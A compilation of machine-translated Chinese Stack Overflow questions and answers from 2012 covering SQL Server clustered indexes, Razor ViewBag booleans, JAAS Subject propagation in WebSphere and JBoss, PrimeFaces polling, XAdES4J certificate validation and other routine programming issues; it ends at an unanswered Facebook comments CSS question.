这就引出了我的问题，数据页*是*存储表数据的地方，对吧？那么如果对它们进行排序，并且其中的数据也按照索引列的值进行排序，为什么说聚集索引保持表数据按排序顺序是错误的呢？这是一张来自 Kalen Delaney 书中的图片，它显示了带有 CI 的表中的叶子页面都是根据 CI 值排序的：

![在此处输入图像描述](../Images/385857efad4a5ceeb85f55552da80d17.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T12:45:07.807

你是对的。

聚集索引**不会**根据聚集索引键对表内的数据进行物理排序。如果是这种情况，那么插入到没有可用空间的大表中间将需要大量的 IO 来为新记录腾出空间。

而是从文件中的任何位置分配一个新页面并链接到链接列表中。

页面的物理顺序与逻辑顺序的不同程度就是逻辑碎片的程度。重建或重组索引可以减少这种情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:49:01.890

创建索引时，还会创建一个索引表（我认为它称为索引分配映射（IAM），名称不太清楚）如果是聚集索引，索引表包含索引列，以及指向实际记录。

所以当一个表有聚集索引时，**数据可能不会在表上进行物理排序**。磁盘中的数据将作为链表维护，聚集索引是指向该数据的指针。

现在索引表将被物理排序......而不是实际的表......并且索引表被维护为 B-Tree，因此搜索会更快。

现在当你创建一个非聚集索引时，它会指向聚集索引表

**编辑：（**正如 marc_s 指出的那样）聚集索引的叶节点实际上包含数据，而在非聚集索引中则包含指针..

但我还是不相信，它会重新排序磁盘中的数据，它只会重新排序指针

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:54:49.643

聚集索引按索引的列对表数据进行排序。插入或更新时，每个新行都将位于表的正确位置。

非聚集索引不会发生这种情况。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-08-17T11:13:35.213

下面的博客文章清楚地解释了聚集索引是如何存储的。

[聚集索引是否真的按键顺序物理存储行？](http://blog.waynesheffield.com/wayne/archive/2012/10/does-a-clustered-index-really-physically-store-the-rows-in-key-order/)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-31T10:48:34.863

**我在这里的原始陈述是错误**
的 ，因为任何索引都**不会**影响表中的数据。聚集索引只是**指向**表中数据的另一种类型的索引。它不会更改顺序或对数据执行任何其他操作。
您始终可以在创建（聚集或非聚集）索引之前和之后直接从具有行号的表中获取数据。
**原始声明结束**

**需要更正**（我不经常使用 MSSQL，所以以前从未有机会对此进行测试）
似乎 MSSQL 将聚集索引实现为根本不是真正的索引，但可能更接近触发器/约束对。

从我现在的粗略测试来看：

1)

```
CREATE TABLE testTable ...  
INSERT ... (few rows)  
SELECT * FROM testTable 
```

这显示了插入顺序中的所有结果

2)

```
CREATE CLUSTERED INDEX ... ON testTable (...); 
INSERT ... (few rows)  
SELECT * FROM testTable 
```

`CLUSTERED INDEX`
这显示了按3)中的字段排序的所有结果

```
DROP INDEX (CLUSTERED INDEX Name) ON testTable;
INSERT ... (few rows)  
SELECT * FROM testTable 
```

**这以相同的顺序**显示了步骤 2) [之前`DROP INDEX`]的所有结果，并再次以插入顺序显示了稍后 [在步骤 3)] 中插入的行。

 **对我来说，这意味着 MSSQL**确实**重新排序了实际的数据记录（很可能在插入/删除时付出了巨大的代价）。

所以，我站着纠正和指责。老实说，我从没想过会出现这种情况（聚集索引行为，而不是我被证明是错误的）。**

# c# - 受限环境中的分析

> ID：12213725
> 
> 赞同：1
> 
> 时间：2012-08-31T10:42:16.217
> 
> 标签：c#, asp.net-mvc-3, analytics

有谁知道可以集成到在受限环境中运行的公司 MVC3 站点中的分析包，无论是开源的还是商业的？

我的项目的（相当严格的）要求是：-

*   该解决方案必须在本地安装，遗憾的是排除了 Google Analytics。
*   该解决方案必须跟踪单个用户/客户的分析。
*   该解决方案必须在 Microsoft 技术堆栈上运行并在 IIS 7.5 下运行。

不幸的是，由于客户的敏感性（IE、安全性和品牌声誉），他们不能使用公开的分析包，因此排除了[Google](http://www.google.com/analytics)、[Open Web Analytics](http://www.openwebanalytics.com/)等）

谢谢，如果我需要使要求更清楚，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:49:13.397

[Piwik](http://piwik.org/)是最好的开源 Web 分析解决方案之一。我了解您需要 Microsoft 堆栈中的解决方案，但这是基于 PHP 的。

我正在使用它来跟踪 SharePoint Web 应用程序，并且我正在使用 IIS 7.5 运行 Piwik。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:54:51.210

将 IIS 配置为使用详细日志。然后使用 IIS 日志分析器工具（有很多，谷歌）。

[http://awstats.sourceforge.net/](http://awstats.sourceforge.net/)非常受欢迎。（PHP，但易于在 IIS 中的单独网站中配置）

基于 .NET 的分析器：[http ://www.iis.net/community/default.aspx?tabid=34&i=1864&g=6](http://www.iis.net/community/default.aspx?tabid=34&i=1864&g=6)

# reporting-services - ssrs 将表单凭据传递给 ssas

> ID：12213727
> 
> 赞同：1
> 
> 时间：2012-08-31T10:42:36.053
> 
> 标签：reporting-services, ssas, sql-server-2012

我想在 SSRS 中创建具有表单身份验证的 Web 服务，然后使用它来查看从 SSAS 多维数据集检索数据的报告。成功登录后，是否可以将相同用户的表单身份验证凭据传递给 SSAS 服务器，以便使用一个凭据用户在两台服务器中进行身份验证？如果是，我该如何完成这项任务？

我正在使用 SQL Server 2012。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:19:13.287

不，因为 SSAS 不允许 Windows 身份验证以外的任何形式的身份验证。您可以明确地使用表单连接到 SSRS（我所说的表单是指 SQL Server 用户），但是从 SSRS 开始，您必须在 SSRS 数据源上使用 AD 用户才能连接到 SSAS。

# javascript - 找不到强大的模块

> ID：12213731
> 
> 赞同：0
> 
> 时间：2012-08-31T10:42:45.107
> 
> 标签：javascript, node.js

> **可能重复：**
> [找不到强大的模块 - Node.js](https://stackoverflow.com/questions/10467668/cannot-find-module-formidable-node-js)

我试图开发一个 node.js 项目。
但是当我尝试执行它时显示
**错误 - 找不到模块'强大'**
我已经尝试过 **npm install -g formidable** 和 **npm install -d**

提前致谢。

# c# - 如何在 Javascript 中比较来自 C# Viewbag 的值？

> ID：12213732
> 
> 赞同：7
> 
> 时间：2012-08-31T10:42:52.180
> 
> 标签：c#, javascript, asp.net-mvc-3

我想比较`Viewbag`javascript 中的布尔值。所以起初我尝试了这个：

```
if (@Viewbag.MyBoolValue)
    do_sth(); 
```

但是后来我在控制台中有错误，例如：（`Value False/True is not declared`不完全是）。

所以我尝试了这个：

```
@{
    string myBool = ((bool)Viewbag.MyBoolValue) ? "true" : "false";
} 
```

在javascript中：

```
if (@myBool == "true")
    do_sth(); 
```

但它也不起作用。我怎样才能让它工作？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-31T10:47:23.177

假设 ViewBag 中的值是 javascript 可以理解的类型，那么您所拥有的应该可以工作。

但是请注意，您的第一个示例很可能不起作用，因为布尔值在 javascript 中是小写，而在 C# 中是大写。考虑到这一点，试试这个：

```
var myBoolValue = @ViewBag.MyBoolValue.ToString().ToLower();
if (myBoolValue)
    do_sth(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:47:34.143

下面将创建一个带有来自 viewbag 的值的 javascript

```
<script>
    var myBoolInJs = @Viewbag.MyBoolValue;
    if(myBoolInJs == true)
     do_sth();
</script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-08T05:50:27.257

```
var myBoolVal = @((ViewBag.MyBoolValue ?? false).ToString().ToLower()); 
```

或者

```
var myBoolVal = '@(ViewBag.MyBoolValue)'==='@true'; 
```

或者

```
 var myBoolVal = @(Json.Encode(ViewBag.MyBoolValue ?? false)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T11:27:36.257

这将起作用。

```
@{     
   string myBool = Viewbag.MyBoolValue.ToString().ToLower(); 
}

if (@myBool)
    do_sth(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-10-13T10:18:57.230

Insted true and false use 0 and 1 in your controller, on top of razor page

```
@{ 
    var isSomething= Viewbag.MyBoolValue;
} 
```

后来下来

```
if (@isSomething== 0) 
```

# java - 从纯客户端调用远程 EJB（RMI over IIOP）时如何传播 JAAS 主题

> ID：12213734
> 
> 赞同：9
> 
> 时间：2012-08-31T10:42:58.853
> 
> 标签：java, jakarta-ee, jboss, websphere, jaas

我正在使用[自定义主体测试](http://docs.oracle.com/javase/6/docs/api/java/security/Principal.html)[JAAS 主题](http://docs.oracle.com/javase/6/docs/api/javax/security/auth/Subject.html)从在原始 Java 运行时上运行的独立 EJB 客户端到 JavaEE 服务器的传播。我的目标是 JBoss 和 WebSphere 实现。

根据[这个论坛帖子](https://community.jboss.org/message/644551)，我希望它可以轻松地与 JBoss 一起使用。

这是我的 EJB 客户端代码片段：

```
Subject subject = new Subject();
Principal myPrincipal = new MyPrincipal("me I myself");
subject.getPrincipals().add(myPrincipal);

PrivilegedExceptionAction<String> action = new PrivilegedExceptionAction<String>() {
    public String run() throws Exception {
            String result;
            System.out.println("Current Subject: " + Subject.getSubject(AccessController.getContext()));
            InitialContext ic = new InitialContext();
            Business1 b = (Business1) ic.lookup("StatelessBusiness1");
            result = b.getNewMessage("Hello World");
            return result;
        }
    };

result = subject.doAs(subject, action);
System.out.println("result "+result); 
```

服务器端代码为：

```
public String getNewMessage(String msg) {
    System.out.println("getNewMessage principal: " + sessionContext.getCallerPrincipal());
    System.out.println("Current Subject: " + Subject.getSubject(AccessController.getContext()));
    return "getNewMessage: " + msg;
} 
```

可以肯定的是，即使它是默认行为，我也已将此部分添加到我的`ejb-jar.xml`会话 bean 中：

```
<security-identity>
   <use-caller-identity/>
</security-identity> 
```

我的会话 bean 不受任何角色的保护。

根据[这个 IBM WebSphere 信息中心部分](http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=/com.ibm.websphere.express.doc/info/exp/ae/tsec_enablesecattprop.html)，我还启用了系统属性`com.ibm.CSI.rmiOutboundPropagationEnabled=true`。

从技术上讲，服务调用在 JBoss 或 WebSphere 上都能正常工作。但是包括我在客户端上创建的自定义主体在内的 JAAS 主题不会传播到服务器。或者当然，`Subject`在 JNDI 上下文创建和 EJB 调用之前转储是可以的。

我为服务器和客户端运行相同的 Java 运行时版本（IBM Java6 SR9 FP2 ...），`MyPrincipal`可序列化的类在服务器 ClassPath 中可用（`AppServer/lib/ext`对于 WebSphere，`server/default/lib`对于 JBoss）

WebSphere 转储：

```
[8/31/12 11:56:26:514 CEST] 00000024 SystemOut     O getNewMessage principal: UNAUTHENTICATED
[8/31/12 11:56:26:515 CEST] 00000024 SystemOut     O Current Subject: null 
```

JBoss 转储：

```
 12:30:20,540 INFO  [STDOUT] getNewMessage principal: anonymous
 12:30:20,540 INFO  [STDOUT] Current Subject: null 
```

当然，我错过了某种魔法。你知道是哪一个吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T04:15:04.770

我怀疑您没有在 WAS 服务器上启用安全性。因为没有启用安全性并且您没有向 WAS 进行身份验证，所以没有凭证。因此，您的呼叫`getCallerPrincipal`返回未经身份验证。

如果您在 WAS 中打开应用程序安全性，则必须通过[CSIv2 协议](http://pic.dhe.ibm.com/infocenter/wasinfo/v8r0/topic/com.ibm.websphere.nd.doc/info/ae/ae/tsec_configiiopauth.html)进行身份验证。在独立客户端中创建您自己的 JAAS 主题不会这样做。如果可以，那么任何人都可以创建“嘿，是我”凭证并登录到他们想要的任何远程 EJB。

通过将主题附加到正在运行的执行线程，您的代码将在服务器上运行。跨网络流动的主体/凭证需要一个协议来实现主体信息的序列化并确保在凭证中声明身份的一方的信任。WAS 从独立客户端接受基本授权、LTPA 和 kerberos 形式的用户信息。这可以在管理控制台内的入站 CSIv2 配置中进行配置。它记录在我之前引用的信息中心链接中。

这是有趣的东西。祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T14:27:23.840

可能这将帮助您降低使用专有 websphere-classes 的价格。我记得，websphere 不会传播 jaas 调用者主题，这对 ibm 来说很典型

```
 package foo.bar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import javax.security.auth.Subject;
import javax.security.auth.login.CredentialExpiredException;
import org.apache.log4j.Logger;
import com.ibm.websphere.security.WSSecurityException;
import com.ibm.websphere.security.auth.CredentialDestroyedException;
import com.ibm.websphere.security.auth.WSSubject;
import com.ibm.websphere.security.cred.WSCredential;

public class IdentityHelper
{
    private static final Logger log = Logger.getLogger(IdentityHelper.class);
    private static final String CLASS_OBJECT = "java.util.HashMap";
    private static final String KEY_OBJECT = "java.lang.String";
    private static final String VALUE_OBJECT = "java.util.HashSet"; 

    private Subject subject=null;
    private WSCredential creds;
    private Set publicCredentials=null;
    public IdentityHelper(Subject _subject) throws WSSecurityException
    {
        if(_subject==null)
        {
            IdentityHelper.log.warn("given subject was null, using Caller-Subject or the RunAs-Subject!");
            this.subject = WSSubject.getCallerSubject();
            if(this.subject==null)this.subject=WSSubject.getRunAsSubject();
        }
        else
        {           
            this.subject=_subject;
        }
        init();
    }
    public IdentityHelper() throws WSSecurityException
    {
        this.subject=WSSubject.getRunAsSubject();
        if(this.subject==null)
        {
            IdentityHelper.log.warn("using Caller-Subject NOT the RunAs-Subject!");
            this.subject = WSSubject.getCallerSubject();
        }
        init();
    }

    private void init() throws WSSecurityException
    {
        Set<WSCredential> credSet= this.subject.getPublicCredentials(WSCredential.class);
        //set should contain exactly one WSCredential
        if(credSet.size() > 1) throw new WSSecurityException("Expected one WSCredential, found " + credSet.size());
        if(credSet.isEmpty())
        {
            throw new WSSecurityException("Found no credentials");
        }
        Iterator<WSCredential> iter= credSet.iterator();
        this.creds=(WSCredential) iter.next();
        this.publicCredentials=this.subject.getPublicCredentials();
    }
    public WSCredential getWSCredential() throws WSSecurityException
    {
        return this.creds;
    }
    public List<String> getGroups() throws WSSecurityException,CredentialDestroyedException,CredentialExpiredException
    {
        WSCredential c = this.getWSCredential();
        return c.getGroupIds();
    }
    /**
     * helper method for obtaining user attributes from Subject objects.
     * @param subject
     * @return
     */
    @SuppressWarnings("unchecked")
    public Map<String, Set<String>> getAttributes()
    {
        Map<String, Set<String>> attributes = null;
        Iterator<?> i = this.subject.getPublicCredentials().iterator();
        while (attributes == null && i.hasNext())
        {
            Map<String, Set<String>> tmp = null;
            Object o = i.next();
            if(IdentityHelper.log.isDebugEnabled())
            {
                IdentityHelper.log.debug("checking for attributes (class name): " + o.getClass().getName());
            }
            if(!o.getClass().getName().equals(CLASS_OBJECT))
                continue;//loop through
            tmp = (Map) o;
            Object tObject = null;
            Iterator<?> t = null;
            t = tmp.keySet().iterator();
            tObject = t.next();
            if(IdentityHelper.log.isDebugEnabled())
            {
                IdentityHelper.log.debug("checking for attributes (key object name): " + tObject.getClass().getName()); 
            }
            if(!tObject.getClass().getName().equals(KEY_OBJECT))
                continue;//loop through
            t = tmp.values().iterator();
            tObject = t.next();
            if(IdentityHelper.log.isDebugEnabled())
            {
                IdentityHelper.log.debug("checking for attributes (value object name): " + tObject.getClass().getName()); 
            }
            if(!tObject.getClass().getName().equals(VALUE_OBJECT))
                continue;//loop through
            attributes = (Map) o;
        }
        if (attributes == null)
        {
            attributes = new HashMap<String, Set<String>>(); 
        }
        return attributes;
    }
    public Subject getSubject()
    {
        return this.subject;
    }
    protected Set getPublicCredentials() {
        return publicCredentials;
    }

} 
```

另请参阅：[从 JAAS 线程获取调用者主题和从线程](http://pic.dhe.ibm.com/infocenter/wasinfo/v8r0/index.jsp?topic=/com.ibm.websphere.nd.doc/info/ae/ae/tsec_getcaller.html)获取[RunAs 主题](http://pic.dhe.ibm.com/infocenter/wasinfo/v6r1/index.jsp?topic=/com.ibm.websphere.express.doc/info/exp/ae/tsec_getrunas.html)

# javascript - 移动网页中文件的最大大小

> ID：12213743
> 
> 赞同：2
> 
> 时间：2012-08-31T10:43:38.413
> 
> 标签：javascript, web, filesize, max, mobile-website

为移动设备构建的网站中 JavaScript 文件的最大大小是多少？我的是80kb。现在我把它减少到 43kb。我还需要减小它的大小吗？如果它是一个大文件会发生什么？

先感谢您。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T10:53:05.393

没有任何有意义的“最大”大小。

不过，在决定可接受的最大尺寸时，您需要考虑一些事项：

*   设备互联网连接 - 是否使用慢速 GPRS (2G) 连接？还是使用更快的 3G/HSPA 连接？对于更快的连接，几百 K 没有问题
*   设备中的内存量。如果您使用大量图像，那么旧设备浏览器将开始挣扎，因为它们用完 RAM 来存储图像。
*   可缓存元素的程度也很重要。如果你有一些大的静态 CSS 文件，那么它们是否被一致使用并不重要，因为浏览器会在第一个页面视图之后将它们缓存在本地。但是无法缓存大量动态内容，因此您会遇到问题。

对此没有硬性规定，因此您需要在目标设备上测试您的页面并自己做出判断。

# c - C中的布尔表达式

> ID：12213747
> 
> 赞同：4
> 
> 时间：2012-08-31T10:43:54.913
> 
> 标签：c, boolean, boolean-operations

我在 C 程序中找到了这个表达式，但我没有得到它：

```
 struct stack_rec *ss;                                          
 ss=(struct stack_rec *)EMalloc(sizeof(struct stack_rec));       
 if (ss) {                                                      
   int res;                                                     
   res = (ss->elem  = * i , 1); // what does this mean ????
   if (res <= 0)                                                
     return res;                                                
   if (*s == 0) {                                               
     ss->next = 0;                                              
   } else {                                                     
     ss->next = *s;                                             
   }                                                            
   *s = ss;                                                     
   return 2;                                                    
 }                                                              
 return 0; 
```

是什么`res = (ss->elem = * i , 1);`意思？是布尔表达式吗？我用 0 而不是 1 尝试过它，它总是返回第二个参数的值！谁能解释一下这个表达？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T10:46:13.847

看起来坏了。这是对逗号运算符的使用，它只计算最终表达式的值，即`1`.

因此，由于该代码等效于：

```
ss->elem = *i;
res = 1; 
```

随后的测试`res`似乎毫无意义，从而断了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:47:34.783

你看到的逗号是一个不太常用的 C 运算符。

基本上，它所做的是执行 2 条语句（ss->elem = *i; 和 1;）。声明1；并没有真正做太多。

之后它返回最后一条语句的结果（在本例中为 1）

# c# - 在 windows phone 7 中的游戏网络中进行实时聊天

> ID：12213757
> 
> 赞同：2
> 
> 时间：2012-08-31T10:44:51.987
> 
> 标签：c#, windows-phone-7, xna

大家好，我正在开发一款需要在玩家组内聊天的游戏。我的意思是我只想让下载了游戏和在线（使用游戏）的玩家聊天。你有什么图书馆可以推荐的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:03:56.983

试试 Openfire [http://www.igniterealtime.org/projects/openfire/](http://www.igniterealtime.org/projects/openfire/)（使用 XMPP 协议）。

# vb.net - 禁用标签上的鼠标事件（启用时）

> ID：12213760
> 
> 赞同：0
> 
> 时间：2012-08-31T10:45:10.363
> 
> 标签：vb.net, events

我有一个由面板、图片框和标签组成的“按钮”。

我已禁用图片框和标签以保持 MouseEnter（和背景颜色）处于活动状态。但是，禁用的标签具有通常的褪色文本 - 有没有办法让标签保持启用但像禁用时一样忽略鼠标事件？

```
Private Sub panelBackup_MouseEnter(sender As Object, e As EventArgs) Handles panelBackupButton.MouseEnter
    Dim btn As Panel = DirectCast(sender, Panel)
    btn.BackColor = Color.Gray
End Sub

Private Sub panelBackup_MouseLeave(sender As Object, e As EventArgs) Handles panelBackupButton.MouseLeave
    Dim btn As Panel = DirectCast(sender, Panel)
    btn.BackColor = Color.LightGray
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:51:34.747

也为标签设置相同的事件

```
Private Sub panelBackup_MouseEnter(sender As Object, e As EventArgs) 
                   Handles panelBackupButton.MouseEnter, Label1.MouseEnter 
    Dim btn As Panel = TryCast(sender, Panel) 
    if Not btn Is Nothing then 
        btn.BackColor = Color.Gray 
    else 
        Dim lbl As Label = TryCast(sender, Label)
        lbl.BackColor = Color.Gray 
    end if
End Sub

Private Sub panelBackup_MouseLeave(sender As Object, e As EventArgs) 
                   Handles panelBackupButton.MouseLeave, Label1.MouseLeave 
    Dim btn As Panel = TryCast(sender, Panel) 
    if Not btn Is Nothing then 
        btn.BackColor = Color.LightGray 
    else 
        Dim lbl As Label = TryCast(sender, Label)
        lbl.BackColor = Color.LightGray 
    end if
End Sub 
```

我还删除了 DirectCast，因为您可以直接使用 panelBackup.BackColor 属性（否则您需要添加不必要的附加逻辑来区分面板或标签触发的事件。

编辑：看到您的评论，我更改了重新引入演员表的方法，但使用 TryCast 来避免标签引发事件时出现异常。我应该提一下，可能会将 TryCast 转换为通用控件而不是特定的面板或标签，因为 BackColor 是从基类（控件）继承的属性

# asp.net - asp.net ajax 的 this.get_element() 在我声明的函数中不起作用

> ID：12213762
> 
> 赞同：1
> 
> 时间：2012-08-31T10:45:12.303
> 
> 标签：asp.net, asp.net-ajax

我尝试通过 this.get_element() 访问我自己的函数中的元素，但它不起作用。

```
 Type.registerNamespace("LabelTimeExtender1");

LabelTimeExtender1.ClientBehavior1 = function(element) {
LabelTimeExtender1.ClientBehavior1.initializeBase(this, [element]);
var testelement=this.get_element();
var timestamp= this.get_element().attributes['TimeStamp'].value;
alert("in constructor");

},

 LabelTimeExtender1.ClientBehavior1.prototype = {
 initialize: function() {
    LabelTimeExtender1.ClientBehavior1.callBaseMethod(this, 'initialize');
    setInterval (this.timer,1000);
    alert("after");

},
dispose: function() {        
    //Add custom dispose actions here
    LabelTimeExtender1.ClientBehavior1.callBaseMethod(this, 'dispose');
},
timer: function(){

debugger;
            var date= new Date(this.timestamp);
            var datenow= new Date ();
            this._element.innerText=" ";
              if(date.getUTCFullYear<datenow.getUTCFullYear)
            {
             var myelement= this.get_element();
             myelement .innerHTML= date.getUTCFullYear.toString();
            }
            if(date.getUTCMonth<datenow.getUTCMonth)
            {
            this.get_element().innerHTML=date.getUTCMonth.toString();
            }
            if(date.getUTCDay<datenow.getUTCDay)
            {
            this.get_element().innerHTML=date.getUTCDay.toString();
            }
            if(date.getUTCHours <datenow.getUTCHours )
            {
             this.get_element().innerHTML=date.getUTCHours .toString();
            }
            if(date.getUTCMinutes<datenow.getUTCMinutes)
            {
            this.get_element().innerHTML=date.getUTCMinutes.toString();
            }

}

}
 LabelTimeExtender1.ClientBehavior1.registerClass('LabelTimeExtender1.ClientBehavior1',   Sys.UI.Behavior);

  if (typeof(Sys) !== 'undefined') Sys.Application.notifyScriptLoaded(); 
```

在这里，我试图访问自定义属性“TimeStamp”并计算时间并分配给要显示的标签。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T21:25:17.443

尝试通过委托调用您的函数。然后您将不会遇到 [this] 关键字的问题

像这样的东西：

```
 setInterval (Function.createDelegate(this, this.timer),1000) 
```

# jsf - 在 jsf primefaces 中停止 ajax 轮询？

> ID：12213764
> 
> 赞同：2
> 
> 时间：2012-08-31T10:45:25.497
> 
> 标签：jsf, primefaces

我正在使用素面 3.2。Ajax 轮询不会停止，我正在使用 stop 属性来停止轮询，并且我正在尝试使用 getter 和 setter 来停止它从 bean 中停止。即使我已经使用 java 脚本停止，但我不能。有什么办法可以停止轮询？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T13:02:38.927

在我的情况下，这段代码就像一个魅力：

```
 <p:poll  interval="2" update="flightsTable" widgetVar="poll"  
         autoStart="false" listener="#{searchFlightBean.checkIfSearchCompleate}"/> 
```

searchFlightBean 中的方法：

```
public void checkIfSearchCompleate() {
    if(searchCompleate) {
        RequestContext reqCtx = RequestContext.getCurrentInstance();
        reqCtx.execute("poll.stop();");
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-15T08:02:31.167

我的解决方案：

```
<h:panelGroup id="chartPanel">
    <h:graphicImage value="#{resource['img:loading.gif']}" 
        rendered="#{!indexController.chartReady}"> 
        <p:poll  interval="1" update="chartPanel" autoStart="true" />
    </h:graphicImage> 
    <p:chart id="chart" type="line" model="#{indexController.chartModel}" 
        rendered="#{indexController.chartReady}" /> 
</h:panelGroup> 
```

当chartReady 为真时轮询停止，bean 中没有更多代码

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-02-12T08:40:40.383

```
<p:poll id="checkListPoll" interval="2" process="@none" 
        update="checkList" widgetVar="chkList"/>
<h:panelGroup id="checkList"> ... </h:panelGroup> 
```

您可以从控制器使用它来停止 ajax 请求：

```
PrimeFaces.current().executeScript("PF('chkList').stop()"); //after Primefaces 7.0 
```

或使用旧的 Primefaces 版本：

```
import org.primefaces.context.RequestContext;
...
RequestContext.getCurrentInstance().execute("PF('chkList').stop()"); //before Primefaces 7.0 
```

# java - 关于 XADES4J 中的签名 SignC

> ID：12213767
> 
> 赞同：0
> 
> 时间：2012-08-31T10:45:52.617
> 
> 标签：java, xades4j

我想了解有关 SignerCTest 的一些信息，因为实际上我有一些问题：

在我的主要课程中：

```
public class XadesTest{

    public static void main(String[] args) throws Exception {

            SignerCTest signerCTest = new SignerCTest();
            System.out.println("signerCTest :  " + signerCTest.toString());
            signerCTest.testSignC();    
    } 
```

在我的 SignerCTest.class 中：

```
 public class SignerCTest extends SignerTestBase
{
    //@Test
    public void testSignC() throws Exception
    {
        System.out.println("signC");

        Document doc = getTestDocument();
        Element elemToSign = doc.getDocumentElement();

        ValidationDataProvider vdp = new ValidationDataFromCertValidationProvider(VerifierTestBase.validationProviderNist);
        SignerC signer = (SignerC)new XadesCSigningProfile(keyingProviderNist, vdp).newSigner();
        new Enveloped(signer).sign(elemToSign);

        outputDocument(doc, "document.signed.c.xml");

    }
} 
```

我有这些错误：

```
signerCTest :  xadestest.SignerCTest@345b43
signC
Exception in thread "main" xades4j.providers.ValidationDataException: Cannot validate certificate: unable to find valid certification path to requested target
    at xades4j.providers.impl.ValidationDataFromCertValidationProvider.getValidationData(ValidationDataFromCertValidationProvider.java:54)
    at xades4j.production.SignerC.getFormatSpecificSignatureProperties(SignerC.java:70)
    at xades4j.production.SignerBES.sign(SignerBES.java:200)
    at xades4j.production.Enveloped.sign(Enveloped.java:69)
    at xadestest.SignerCTest.testSignC(SignerCTest.java:45)
    at xadestest.XadesTest.main(XadesTest.java:84)
Caused by: xades4j.providers.CannotBuildCertificationPathException: unable to find valid certification path to requested target
    at xades4j.providers.impl.PKIXCertificateValidationProvider.validate(PKIXCertificateValidationProvider.java:142)
    at xades4j.providers.impl.ValidationDataFromCertValidationProvider.getValidationData(ValidationDataFromCertValidationProvider.java:51)
    ... 5 more
Java Result: 1
BUILD SUCCESSFUL (total time: 17 seconds) 
```

但是证书在这里很好：

```
D:\NetBeansProjects_MYSIGN\XadesTest\src\test\cert\my\LG.pfx

D:\NetBeansProjects_MYSIGN\XadesTest\src\test\cert\csrc.nist\test4.p12 
```

所以……我不明白。有谁能够帮我 ？

谢谢，威廉。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-01T16:35:23.777

您使用的测试仅依赖于 NIST 的证书。

`CertificateValidationProvider`测试使用的 ( )`VerifierTestBase.validationProviderNist`启用了证书吊销检查。另外，请注意，它是使用`CertStore`反映*csrc.nist*文件夹内容的 a 创建的。这意味着*csrc.nist*文件夹必须包含 CRL 和其他中间证书，以便提供者可以构建证书链并检查吊销状态。

# java - Eclipse - Android 配置问题

> ID：12213771
> 
> 赞同：0
> 
> 时间：2012-08-31T10:45:58.827
> 
> 标签：java, android, eclipse

> **可能重复：**
> [在哪里可以找到旧版本的 Eclipse ADT](https://stackoverflow.com/questions/4710107/where-can-i-find-older-versions-of-eclipse-adt)
> [在 Eclipse 中找不到 AVD 或 SDK 管理器](https://stackoverflow.com/questions/12028811/cant-find-avd-or-sdk-manager-in-eclipse)

我很难在 Eclipse 上安装 Android 环境。我已经尝试了所有常见的修复方法，比如以管理员身份运行，但没有成功。

我已经安装了多次检查过的 ADT 插件，但是当我重新启动 Eclipse 并转到 Window-Perspective Android 时没有出现。我提出了一个新问题，因为我尝试过的所有解决方案都没有奏效。

Eclipse 版本 - 面向 Java EE 开发人员的 Eclipse IDE

我已经下载了 Android SDK，这很好，但似乎无法使用 Eclipse。呸！

有人有什么想法吗？

PS 我已经尝试使用 Eclipse Classic 并且问题仍然相同。

找到的解决方案：[我在哪里可以找到旧版本的 Eclipse ADT](https://stackoverflow.com/questions/4710107/where-can-i-find-older-versions-of-eclipse-adt)可以在此处找到旧版本的 ADT，以便与我拥有的 Java 版本一起使用。感谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:23:36.187

*   [http://developer.android.com/sdk/installing/installing-adt.html](http://developer.android.com/sdk/installing/installing-adt.html)

如果您将使用 ADT 插件在 Eclipse 中进行开发，请首先确保您的计算机上安装了符合系统要求的合适版本的 Eclipse。

如果需要安装 Eclipse，可以从[http://www.eclipse.org/downloads/](http://www.eclipse.org/downloads/)下载。我们`recommend`的“ `Eclipse Classic`”版本。否则，您应该使用 Java 或 RCP 版本的 Eclipse。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:56:08.183

我也无法为 Eclipse Juno 安装 ADT 插件，所以我不得不在 Eclipse Indigo 上呆了一段时间。我注意到其他人也有同样的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:50:53.617

你需要

*   JDK
*   安卓 SDK
*   ADT 插件
*   蚀

在eclipse中转到->帮助->安装新软件->选择ADT XX ...

然后转到 windows -> 首选项 -> 设置 android sdk 路径

另请参阅此链接以获取[逐步教程](http://developer-android.blogspot.in/2012/06/how-to-install-android-step-by-step.html)

# css - 如何在 Facebook 评论框插件上应用自定义 CSS

> ID：12213775
> 
> 赞同：1
> 
> 时间：2012-08-31T10:46:24.140
> 
> 标签：css, facebook, comments

